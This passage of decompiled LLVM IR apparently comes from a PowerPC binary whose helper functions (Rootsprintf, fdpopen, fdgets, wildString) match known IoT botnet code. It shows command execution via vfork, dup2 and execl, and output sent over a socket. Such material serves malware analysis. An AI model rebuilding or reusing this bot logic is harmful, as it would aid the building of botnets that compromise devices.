dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 5, 0, 6, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 2048, i32* @r3, align 4
  store i32 268440016, i32* @lr, align 4
  %v0_100011cc = call i32 @malloc()
  store i32 %v0_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v0_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v0_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v0_100011cc, i32 %v0_10001258, i32 16384)
  store i32 %v0_100011cc, i32* @r3, align 4
  store i32 268440196, i32* @lr, align 4
  %v0_10001280 = call i32 @free()
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v0_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp16 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp16, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_10023534.16, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v1_10001340 = call i32 @getdtablesize(i32 268566528)
  %v2_10001350 = icmp sgt i32 %v1_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v1_10001340, 4
  store i32 %v1_10001368, i32* @r3, align 4
  store i32 268440436, i32* @lr, align 4
  %v0_10001370 = call i32 @malloc()
  store i32 %v0_10001370, i32* @global_var_10023534.16, align 4
  %v3_10001388 = icmp eq i32 %v0_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.17 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v0_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.18 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp4, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp4, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.19 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v10_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10010c54.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_10010c5c.21 to i32), i32 ptrtoint ([3 x i8]* @global_var_10010c60.22 to i32), i32 %arg1, i32 0, i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.24 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp4, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_10023534.16, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_10023534.16, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_10023534.16, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_10023534.16, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_10010c64.25 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp9, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp9)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp9, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
